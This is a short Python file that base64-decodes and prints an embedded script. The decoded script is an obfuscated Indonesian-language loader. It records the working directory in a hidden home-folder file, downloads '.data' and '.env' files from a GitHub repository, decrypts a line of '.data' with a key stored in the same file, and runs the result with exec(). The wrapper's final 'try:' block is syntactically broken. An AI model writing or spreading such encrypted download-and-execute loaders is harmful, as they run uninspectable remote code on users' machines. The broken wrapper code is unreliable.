import base64

encoded_script ="aW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKZnJvbSBhcmdwYXJzZSBpbXBvcnQgQXJndW1lbnRQYXJzZXIKZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXQKZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMgaW1wb3J0IGhhc2hlcwpmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5rZGYucGJrZGYyIGltcG9ydCBQQktERjJITUFDCgpkZWYgY3JlYXRlX2xvY2F0aW9uX2ZpbGUoKToKICAgIGN1cnJlbnRfZGlyID0gb3MuZ2V0Y3dkKCkKICAgIGhvbWVfZGlyID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikKICAgIGFsYW1hdF9maWxlID0gb3MucGF0aC5qb2luKGhvbWVfZGlyLCAiLmFsYW1hdCIpCiAgICB3aXRoIG9wZW4oYWxhbWF0X2ZpbGUsICd3JykgYXMgZjoKICAgICAgICBmLndyaXRlKGN1cnJlbnRfZGlyKQoKZGVmIGdldF9mZXJuZXQoa2V5X3N0cmluZyk6CiAgICBzYWx0ID0gYidzYWx0XycKICAgIGtkZiA9IFBCS0RGMkhNQUMoCiAgICAgICAgYWxnb3JpdGhtPWhhc2hlcy5TSEEyNTYoKSwKICAgICAgICBsZW5ndGg9MzIsCiAgICAgICAgc2FsdD1zYWx0LAogICAgICAgIGl0ZXJhdGlvbnM9MTAwMDAwLAogICAgKQogICAga2V5ID0gYmFzZTY0LnVybHNhZmVfYjY0ZW5jb2RlKGtkZi5kZXJpdmUoa2V5X3N0cmluZy5lbmNvZGUoKSkpCiAgICByZXR1cm4gRmVybmV0KGtleSkKCmRlZiBkZWNyeXB0X2NvbnRlbnQoZmVybmV0LCBlbmNyeXB0ZWRfY29udGVudCk6CiAgICByZXR1cm4gZmVybmV0LmRlY3J5cHQoZW5jcnlwdGVkX2NvbnRlbnQpLmRlY29kZSgpCgpkZWYgdmFsaWRhdGVfZGF0YV9jb250ZW50KGVuY3J5cHRlZF9jb250ZW50cyk6CiAgICBpZiBsZW4oZW5jcnlwdGVkX2NvbnRlbnRzKSA8IDEwOgogICAgICAgIHJldHVybiBGYWxzZQogICAgdHJ5OgogICAgICAgIGlmIG5vdCBlbmNyeXB0ZWRfY29udGVudHNbM10uc3RyaXAoKS5lbmRzd2l0aChiJyAzJyk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgICAgIGlmIG5vdCBlbmNyeXB0ZWRfY29udGVudHNbN10uc3RyaXAoKS5lbmRzd2l0aChiJyA3Jyk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEluZGV4RXJyb3I6CiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICByZXR1cm4gVHJ1ZQoKZGVmIGdldF9sYXRlc3RfdmVyc2lvbigpOgogICAgdHJ5OgogICAgICAgIGFwaV91cmwgPSAiaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9ib2NpbC10ZXJtdXgvcmVwby9jb250ZW50cy9kYXRhIgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGFwaV91cmwpCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICBkaXJlY3RvcmllcyA9IFtpdGVtWyduYW1lJ10gZm9yIGl0ZW0gaW4gcmVzcG9uc2UuanNvbigpIGlmIGl0ZW1bJ3R5cGUnXSA9PSAnZGlyJ10KICAgICAgICAgICAgdmVyc2lvbnMgPSBbdiBmb3IgdiBpbiBkaXJlY3RvcmllcyBpZiB2LnJlcGxhY2UoJy4nLCAnJykuaXNkaWdpdCgpXQogICAgICAgICAgICBpZiB2ZXJzaW9uczoKICAgICAgICAgICAgICAgIHJldHVybiBzb3J0ZWQodmVyc2lvbnMsIGtleT1sYW1iZGEgeDogW2ludChudW0pIGZvciBudW0gaW4geC5zcGxpdCgnLicpXSlbLTFdCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKICAgIHJldHVybiBOb25lCgpkZWYgZG93bmxvYWRfZmlsZXModmVyc2lvbik6CiAgICB0cnk6CiAgICAgICAgYmFzZV91cmwgPSBmImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ib2NpbC10ZXJtdXgvcmVwby9tYWluL2RhdGEve3ZlcnNpb259LyIKICAgICAgICBkYXRhX3VybCA9IGJhc2VfdXJsICsgIi5kYXRhIgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGRhdGFfdXJsKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgd2l0aCBvcGVuKCcuZGF0YScsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKHJlc3BvbnNlLmNvbnRlbnQpCiAgICAgICAgZW52X3VybCA9IGJhc2VfdXJsICsgIi5lbnYiCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQoZW52X3VybCkKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHdpdGggb3BlbignLmVudicsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKHJlc3BvbnNlLmNvbnRlbnQpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcmV0dXJuIEZhbHNlCgpkZWYgY2hlY2tfZm9yX3VwZGF0ZXMoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnLmRhdGEnKToKICAgICAgICBwcmludCgiRGF0YSBrb3NvbmcsIGphbGFua2FuIHBlcmludGFoIHB5dGhvbjMgbXVsYWkucHkgLS11cGRhdGUiKQogICAgICAgIHN5cy5leGl0KDEpCiAgICB3aXRoIG9wZW4oJy5kYXRhJywgJ3JiJykgYXMgZjoKICAgICAgICBmaXJzdF9saW5lID0gZi5yZWFkbGluZSgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGlmIG5vdCBmaXJzdF9saW5lLnN0YXJ0c3dpdGgoJyMgdmVyc2lvbiAnKToKICAgICAgICBwcmludCgiRGF0YSB0aWRhayB2YWxpZCwgamFsYW5rYW4gcGVyaW50YWggcHl0aG9uMyBtdWxhaS5weSAtLXVwZGF0ZSIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIGN1cnJlbnRfdmVyc2lvbiA9IGZpcnN0X2xpbmUuc3BsaXQoJyAnKVsyXQogICAgbGF0ZXN0X3ZlcnNpb24gPSBnZXRfbGF0ZXN0X3ZlcnNpb24oKQogICAgaWYgbGF0ZXN0X3ZlcnNpb24gYW5kIGxhdGVzdF92ZXJzaW9uID4gY3VycmVudF92ZXJzaW9uOgogICAgICAgIHByaW50KGYiXG5WZXJzaSB0ZXJiYXJ1IHtsYXRlc3RfdmVyc2lvbn0gdGVyc2VkaWEgKHZlcnNpIEFuZGE6IHtjdXJyZW50X3ZlcnNpb259KSIpCiAgICAgICAgaW5wdXQoIlRla2FuIEVudGVyIHVudHVrIG1lbmRvd25sb2FkIGF0YXUgQ1RSTCtDIHVudHVrIGJhdGFsLi4uIikKICAgICAgICBpZiBkb3dubG9hZF9maWxlcyhsYXRlc3RfdmVyc2lvbik6CiAgICAgICAgICAgIHByaW50KCJWZXJzaSB0ZXJiYXJ1IHN1ZGFoIGRpZG93bmxvYWQsIGphbGFua2FuIHVsYW5nIHRvb2xzIGluaSIpCiAgICAgICAgICAgIHN5cy5leGl0KDApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoIkdhZ2FsIG1lbmRvd25sb2FkIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKICAgIHJldHVybiBGYWxzZQoKZGVmIGxvYWRfYW5kX2V4ZWN1dGUoKToKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnLmRhdGEnKToKICAgICAgICBwcmludCgiRGF0YSBrb3NvbmcsIGphbGFua2FuIHBlcmludGFoIHB5dGhvbjMgbXVsYWkucHkgLS11cGRhdGUiKQogICAgICAgIHN5cy5leGl0KDEpCiAgICB3aXRoIG9wZW4oJy5kYXRhJywgJ3JiJykgYXMgZjoKICAgICAgICBlbmNyeXB0ZWRfY29udGVudHMgPSBmLnJlYWQoKS5zcGxpdChiJ1xuJykKICAgIGlmIG5vdCB2YWxpZGF0ZV9kYXRhX2NvbnRlbnQoZW5jcnlwdGVkX2NvbnRlbnRzKToKICAgICAgICBwcmludCgiRGF0YSB0aWRhayB2YWxpZCwgamFsYW5rYW4gcGVyaW50YWggcHl0aG9uMyBtdWxhaS5weSAtLXVwZGF0ZSIpCiAgICAgICAgc3lzLmV4aXQoMSkKICAgIHRyeToKICAgICAgICBrZXlfc3RyaW5nID0gZW5jcnlwdGVkX2NvbnRlbnRzWzddLnJzdHJpcChiJyA3JykuZGVjb2RlKCkKICAgICAgICBmZXJuZXQgPSBnZXRfZmVybmV0KGtleV9zdHJpbmcpCiAgICAgICAgY29kZV90b19leGVjdXRlID0gZGVjcnlwdF9jb250ZW50KGZlcm5ldCwgZW5jcnlwdGVkX2NvbnRlbnRzWzNdLnJzdHJpcChiJyAzJykpCiAgICAgICAgZXhlYyhjb2RlX3RvX2V4ZWN1dGUsIGdsb2JhbHMoKSkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcHJpbnQoIkRhdGEgdGlkYWsgdmFsaWQsIGphbGFua2FuIHBlcmludGFoIHB5dGhvbjMgbXVsYWkucHkgLS11cGRhdGUiKQogICAgICAgIHN5cy5leGl0KDEpCgpkZWYgbWFpbigpOgogICAgIyBDcmVhdGUvdXBkYXRlIC5hbGFtYXQgZmlsZSBpbiBob21lIGRpcmVjdG9yeSB3aXRoIGN1cnJlbnQgZGlyZWN0b3J5CiAgICBjcmVhdGVfbG9jYXRpb25fZmlsZSgpCiAgICAKICAgIHBhcnNlciA9IEFyZ3VtZW50UGFyc2VyKCkKICAgIHBhcnNlci5hZGRfYXJndW1lbnQoJy0tdXBkYXRlJywgYWN0aW9uPSdzdG9yZV90cnVlJywgaGVscD0nVXBkYXRlIHRvIGxhdGVzdCB2ZXJzaW9uJykKICAgIGFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpCiAgICBpZiBhcmdzLnVwZGF0ZToKICAgICAgICBsYXRlc3RfdmVyc2lvbiA9IGdldF9sYXRlc3RfdmVyc2lvbigpCiAgICAgICAgaWYgbGF0ZXN0X3ZlcnNpb246CiAgICAgICAgICAgIGlmIGRvd25sb2FkX2ZpbGVzKGxhdGVzdF92ZXJzaW9uKToKICAgICAgICAgICAgICAgIHByaW50KCJWZXJzaSB0ZXJiYXJ1IHN1ZGFoIGRpZG93bmxvYWQsIGphbGFua2FuIHVsYW5nIHRvb2xzIGluaSIpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIkdhZ2FsIG1lbmRvd25sb2FkIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiVGlkYWsgZGFwYXQgbWVuZW11a2FuIHZlcnNpIHRlcmJhcnUiKQogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgZWxzZToKICAgICAgICBpZiBjaGVja19mb3JfdXBkYXRlcygpOgogICAgICAgICAgICBzeXMuZXhpdCgwKQogICAgICAgIGxvYWRfYW5kX2V4ZWN1dGUoKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo="

try:
decoded_code = base64.b64decode(encoded_script).decode()
print(decoded_code)

